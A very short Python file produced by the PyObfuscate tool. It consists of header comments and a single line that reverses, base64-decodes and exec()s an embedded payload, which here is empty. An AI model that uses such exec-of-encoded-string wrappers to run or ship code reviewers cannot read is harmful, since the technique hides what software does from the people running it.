# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Mon Jul  3 15:29:13 2023
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))